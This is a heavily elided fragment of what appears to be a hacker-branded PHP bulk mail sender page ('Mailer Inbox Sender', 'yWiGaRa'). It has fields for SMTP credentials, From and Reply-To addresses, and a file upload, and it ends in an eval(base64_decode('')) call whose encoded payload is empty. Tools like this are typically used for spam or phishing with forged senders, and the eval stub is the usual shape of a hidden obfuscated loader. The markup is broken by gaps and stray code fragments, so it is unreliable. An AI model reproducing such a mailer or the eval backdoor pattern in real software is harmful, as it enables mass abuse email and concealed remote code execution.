...
<body text="#000000">
<body background="https://www.google.co.id/url?sa=i&rct=j&q=&esrc=s&source=images&cd=&cad=rja&uact=8&ved=0ahUKEwjnztaA4JnKAhWTWo4KHbYeDSwQjRwIBw&url=http%3A%2F%2Fwww.meh.ro%2Ftag%2Fanonymous%2F&bvm=bv.110151844,d.c2E&psig=AFQjCNGVmNWW7nE-IJ1noDmUNhLgzKycFA&ust=1452326439482875">
<p align="center"><font size="5" face="Bauhaus 93">Mailer Inbox Sender</font></p>
<p align="center"><font size="5" face="Bauhaus 93">yWiGaRa</font></p>
<form name="form1" method="post" action="" enctype="multipart/form-data">
  ...
  <table width="100%" border="0" height="407">
    ...
    <tr>
      ...
      <td width="10%" height="22" bgcolor="#AFEEEE">
      ...
      <td width="18%" height="22" bgcolor="#AFEEEE"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="smtp_username" value="<?=$smtp_username;?>" size="30">

        </font></td>

      <td width="31%" height="22" bgcolor="#AFEEEE">
      ...
      <td width="41%" height="22" bgcolor="#AFEEEE"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
    ...
    <tr>
      ...
      <td width="18%" height="22" bgcolor="#AFEEEE">
    ...
    <tr>
      ...
      <td width="100%" height="39" bgcolor="#AFEEEE" colspan="4">
    ...
    <tr>
      ...
      <td width="10%" height="22" bordercolor="#AFEEEE" bgcolor="#AFEEEE">
      ...
      <td width="18%" height="22" bordercolor="#AFEEEE" bgcolor="#AFEEEE"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="from" value="<?=$from;?>" size="30">

        </font></td>

      <td width="31%" height="22" bordercolor="#AFEEEE" bgcolor="#AFEEEE">
      ...
      <td width="41%" height="22" bordercolor="#AFEEEE" bgcolor="#AFEEEE"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
    ...
    <tr>
      ...
      <td width="10%" height="22" bgcolor="#AFEEEE" bordercolor="#AFEEEE">
      ...
      <td width="18%" height="22" bgcolor="#AFEEEE" bordercolor="#AFEEEE"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

        <input type="text" name="replyto" value="<?=$replyto;?>" size="30">

        </font></td>

      <td width="31%" height="22" bgcolor="#AFEEEE" bordercolor="#AFEEEE">

        <p align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        Email Priority:</font></td>

      <td width="41%" height="22" bgcolor="#AFEEEE" bordercolor="#AFEEEE"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
    ...
    <tr>
      ...
      <td colspan="3" height="22" bordercolor="#AFEEEE" bgcolor="#AFEEEE"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
...
<td colspan="3" height="190" bordercolor="#AFEEEE" bgcolor="#AFEEEE"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 
      ...
      <td width="41%" height="190" bordercolor="#AFEEEE" bgcolor="#AFEEEE"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
...
<input type="submit" class="inputzbut" name="submit" value="Upload" style="font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666; background-color: #FF0000"><br>'. $resultati .'</form></center></td></tr></table></div>'; 
	...
	eval(base64_decode(''));
